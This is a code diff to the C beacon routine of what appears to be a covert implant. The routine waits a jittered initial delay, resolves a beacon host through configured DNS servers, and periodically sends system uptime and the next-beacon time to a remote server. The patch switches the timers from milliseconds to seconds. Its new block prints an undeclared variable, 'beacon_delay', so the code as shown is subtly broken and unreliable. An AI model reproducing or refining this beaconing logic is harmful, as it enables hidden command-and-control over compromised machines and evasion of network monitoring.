@@ -52,6 +52,9 @@ int calc_jitter(int baseTime, float jitterPercent)
 	int jitterRange = 0;
 
 	jitterRange = baseTime * jitterPercent;
+	if (jitterRange == 0)
+		return 0;
+
 	// Determine if the jitter will be positive or negative.
 	if (rand() > RAND_MAX / 2) {
 		return rand() % jitterRange;	//make it positive
@@ -104,8 +107,7 @@ int beacon_start(BEACONINFO *beaconInfo)
 		} else {
 			break;
 		}
-		// TODO: should this be Sleep( 60 * 100 ); ???
-		sleep(60);
+		sleep(60);	// Sleep for 1 minute
 	}
 	if (make_thread(beacon, (void *) beaconInfo) != SUCCESS) {
 		DLX(1, printf(" ERROR: failed to create beacon thread\n"));
@@ -130,13 +132,19 @@ void *beacon(void *param)
 	DLX(4, printf("\t%32s: %-d\n", "Beacon Server Port", beaconInfo->port));
 	DLX(4, printf("\t%32s: %-s\n", "Primary DNS Server IP Address", beaconInfo->dns[0]));
 	DLX(4, printf("\t%32s: %-s\n", "Secondary DNS Server IP Address", beaconInfo->dns[1]));
-	DLX(4, printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo->initDelay/1000));
-	DLX(4, printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo->interval/1000));
-	DLX(4, printf("\t%32s: %-f\n\n", "Beacon Variance (%)", beaconInfo->percentVariance));
+	DLX(4, printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo->initDelay));
+	DLX(4, printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo->interval));
+	DLX(4, printf("\t%32s: %-f\n\n", "Beacon Variance", beaconInfo->percentVariance));
 
-	DLX(4, printf("\nStarting beacon thread with initial beacon delay of %ld seconds\n", beaconInfo->initDelay / 1000));
-	if (beaconInfo->percentVariance > 0)
-		Sleep(beaconInfo->initDelay + calc_jitter(beaconInfo->initDelay, beaconInfo->percentVariance));	// Wait for initial delay + jitter
+	{	// Determine the initial beacon delay
+		int initial_beacon_delay;
+
+		initial_beacon_delay = beaconInfo->percentVariance > 0 ?
+					beaconInfo->initDelay + calc_jitter(beaconInfo->initDelay, beaconInfo->percentVariance) : beaconInfo->initDelay;
+
+		DLX(4, printf("\nStarting beacon thread with initial beacon delay of %ld seconds\n", beacon_delay));
+		sleep(initial_beacon_delay);
+	}
 
 	for (;;) {		// Beacon Loop
 		secondsUp = GetSystemUpTime(); // Get system uptime
@@ -153,7 +161,7 @@ void *beacon(void *param)
 		}
 
 		// Resolve beacon IP address
-		if (inet_pton(AF_INET, beaconInfo->host, &beaconIPaddr) <= 0) {		// Determine if beacon host is an name or dotted-quad address
+		if (inet_pton(AF_INET, beaconInfo->host, &beaconIPaddr) <= 0) {		// Determine if beacon host is a name or dotted-quad address
 			for (i = 0; i < 2; i++) {
 				if (strlen(beaconInfo->dns[i]))
 					DLX(4, printf("\tPerforming DNS lookup for %s using DNS server at %s.\n", beaconInfo->host, beaconInfo->dns[i]));
@@ -179,8 +187,8 @@ void *beacon(void *param)
 		Free(beaconInfo->ip);
 
 	sleep:
-		DLX(4, printf("\tSending next beacon in %d seconds.\n", beaconInterval / 1000));
-		Sleep(beaconInterval);	//Sleep for the length of the interval
+		DLX(4, printf("\tSending next beacon in %d seconds.\n", beaconInterval));
+		sleep(beaconInterval);	// Sleep for the length of the interval
 
 	}
 
@@ -307,7 +315,7 @@ static int send_beacon_data(BEACONINFO * beaconInfo, unsigned long uptime, int n
 	// Next-beacon time in seconds
 	next_beacon_hdr.type = htons(NEXT_BEACON_TIME);
 	memset(temp, 0, 1024);
-	sprintf(temp, "%d", (next_beacon / 1000));
+	sprintf(temp, "%d", next_beacon);
 
 	next_beacon_len = strlen(temp);
 	next_beacon_hdr.length = htons(next_beacon_len);
